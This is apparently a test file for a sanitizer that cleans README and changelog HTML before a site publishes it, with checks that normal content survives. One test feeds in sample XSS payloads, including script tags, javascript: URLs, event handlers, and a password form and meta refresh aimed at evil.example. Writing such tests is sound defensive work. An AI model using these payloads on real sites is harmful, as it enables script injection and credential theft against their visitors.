// README / CHANGELOG HTML published on the site: what a README can't do (run script), what it keeps.
import { test } from "node:test";
import assert from "node:assert/strict";
import { Marked } from "marked";
import { gfmHeadingId } from "marked-gfm-heading-id";
import { sanitizeReadme, resolveAnchors, idsOf } from "../src/lib/readme-html.ts";

const render = (md) => {
  const marked = new Marked({ gfm: true });
  marked.use(gfmHeadingId());
  return sanitizeReadme(marked.parse(md));
};

test("a booby-trapped README is neutralised", () => {
  const html = render(
    [
      "# Title",
      "<script>alert(1)</script>",
      "[x](javascript:alert(document.domain)) [y](JaVaScRiPt:alert(1)) [z](data:text/html;base64,PHNjcmlwdD4=)",
      '<img src=x onerror="alert(1)"> <img src="javascript:alert(1)">',
      '<a href="javascript:alert(1)">a</a> <a href="vbscript:msgbox(1)">b</a> <a href="  javascript:alert(1)">c</a>',
      '<div onclick="alert(1)" onmouseover="alert(1)" style="position:fixed;inset:0">overlay</div>',
      '<iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x.swf">',
      '<svg><script>alert(1)</script></svg><math><mi>x</mi></math>',
      '<form action="https://evil.example"><input type="password" name="p"><button>Go</button></form>',
      '<style>body{display:none}</style><link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">',
      '<base href="https://evil.example/"><template><img src=x onerror=alert(1)></template>',
      '<p class="hero ha-card" id="announce">steals a class and an id</p>',
      '<a href="https://example.com" target="_top" rel="opener">tab</a>',
      '<picture><source srcset="javascript:alert(1)"><img src="https://x.test/a.png"></picture>',
    ].join("\n\n"),
  );
  assert.doesNotMatch(html, /<script|<iframe|<object|<embed|<svg|<math|<form|<style|<link|<meta|<base|<template|<button/i);
  assert.doesNotMatch(html, /\son[a-z]+=/i, "no event handler attribute");
  assert.doesNotMatch(html, /(href|src|srcset)="\s*(javascript|vbscript|data):/i, "no script URL");
  assert.doesNotMatch(html, /\sstyle=/i);
  assert.doesNotMatch(html, /type="password"/);
  assert.doesNotMatch(html, /class="hero|ha-card/, "no class taken from the page");
  assert.doesNotMatch(html, /id="announce"/, "no id of the page");
  assert.match(html, /id="readme-announce"/);
  assert.match(html, /<a href="https:\/\/example\.com" target="_blank" rel="noopener noreferrer">tab<\/a>/);
  // The text of a dropped tag is kept (escaped), the body of a script is not
  assert.match(html, /overlay/);
  assert.doesNotMatch(html, /alert\(1\)<\/|>alert/);
});

test("data: URIs stay allowed on images only", () => {
  const html = sanitizeReadme('<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot"><a href="data:image/png;base64,iVBORw0KGgo=">l</a>');
  assert.match(html, /<img src="data:image\/png;base64,iVBORw0KGgo=" alt="dot" \/>|<img src="data:image\/png;base64,iVBORw0KGgo=" alt="dot">/);
  assert.match(html, /<a>l<\/a>/);
});

test("a normal README keeps its pictures, folds, tables, links, alerts and task lists", () => {
  const md = [
    '<p align="center"><img src="images/logo.png" alt="Logo" width="96" height="96"></p>',
    "",
    "## Overview",
    "",
    "See the [Overview](#overview) and the [options](#options), or [GitHub](https://github.com/juju35/ha-parcel). Press <kbd>Ctrl</kbd>+<kbd>K</kbd>, H<sub>2</sub>O, x<sup>2</sup>, ~~old~~.",
    "",
    "<picture>",
    '  <source media="(prefers-color-scheme: dark)" srcset="screenshots/card-dark.png">',
    '  <img src="screenshots/card.png" alt="Card" width="492">',
    "</picture>",
    "",
    "> [!NOTE]",
    "> Read **this** first.",
    "",
    "<details>",
    "<summary>More screenshots</summary>",
    "",
    "![Mini](screenshots/mini.png)",
    "",
    "</details>",
    "",
    "### Options",
    "",
    "| Option | Default | Description |",
    "| :--- | :---: | ---: |",
    "| `entity` | — | The `sensor` to show |",
    "",
    "- [x] done",
    "- [ ] to do",
    "",
    "```yaml",
    "type: custom:parcel-card",
    "```",
    "",
    '<a href="https://my.home-assistant.io/redirect/hacs_repository/?owner=juju35&repository=ha-parcel&category=integration"><img src="https://my.home-assistant.io/badges/hacs_repository.svg" alt="Open in HACS"></a>',
  ].join("\n");
  const marked = new Marked({ gfm: true });
  marked.use(gfmHeadingId());
  const before = marked.parse(md);
  const after = sanitizeReadme(before);
  // Only the ids (and #links to them) change; checkboxes are normalised to read-only ones
  const normal = (h) =>
    h
      .replace(/(id|name)="readme-/g, '$1="')
      .replace(/href="#readme-/g, 'href="#')
      .replace(/<input[^>]*>/g, (m) => (/checked/.test(m) ? "[x]" : "[ ]"))
      .replace(/\s*\/>/g, ">")
      .replace(/&quot;/g, '"')
      .replace(/&amp;/g, "&");
  assert.equal(normal(after), normal(before));
  for (const tag of ["picture", "source", "details", "summary", "table", "thead", "kbd", "sub", "sup", "del", "blockquote", "pre"]) {
    assert.match(after, new RegExp(`<${tag}\\b`), tag);
  }
  assert.match(after, /<p align="center">/);
  assert.match(after, /<th align="center">Default<\/th>/);
  assert.match(after, /<code class="language-yaml">/);
  assert.match(after, /<source media="\(prefers-color-scheme: dark\)" srcset="screenshots\/card-dark.png"/);
  assert.match(after, /<h2 id="readme-overview">Overview<\/h2>/);
  assert.match(after, /<a href="#readme-overview">Overview<\/a>/);
  assert.match(after, /<input type="checkbox" disabled(="")? checked(="")? ?\/?>/);
});

test("README headings never reuse the page's ids (#overview, #install, #gallery…)", () => {
  const html = render("## Install\n\n### Overview\n\n### Gallery\n\n### Documentation\n\n### Changelog\n\n[up](#overview)");
  for (const id of ["overview", "install", "gallery", "documentation", "changelog"]) {
    assert.ok(!idsOf(html).has(id), id);
    assert.ok(idsOf(html).has(`readme-${id}`), id);
  }
  assert.match(html, /href="#readme-overview"/);
});

test("links to a README section the site leaves out are resolved", () => {
  const html = sanitizeReadme('<p>See the <a href="#screenshots">drawn models</a> and <a href="#options">options</a>, <a href="#missing">x</a>.</p><h3 id="options">Options</h3>');
  const out = resolveAnchors(html, idsOf(html), (a) => (a === "screenshots" ? "#gallery" : `https://github.com/juju35/ha-nas-card#${a}`));
  assert.match(out, /<a href="#gallery">drawn models<\/a>/);
  assert.match(out, /<a href="#readme-options">options<\/a>/);
  assert.match(out, /<a href="https:\/\/github.com\/juju35\/ha-nas-card#missing" target="_blank" rel="noopener noreferrer">x<\/a>/);
});
